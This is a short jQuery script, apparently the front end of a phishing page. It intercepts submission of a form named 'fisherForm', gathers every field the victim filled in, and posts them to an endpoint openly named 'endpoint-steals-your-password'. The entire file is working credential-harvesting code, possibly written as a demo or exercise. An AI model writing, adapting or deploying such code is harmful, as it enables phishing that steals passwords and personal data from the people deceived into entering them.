
$(document).ready(() => {
    console.log("Front is ready");

    $("#fisherForm").submit(event => {
        event.preventDefault();
        const data = $("#fisherForm")
                            .serializeArray()
                            .reduce((acc, entry) => { acc[entry.name] = entry.value; return acc }, {});

        $.post("endpoint-steals-your-password", { ...data }).then(res => alert(res));
    });
})
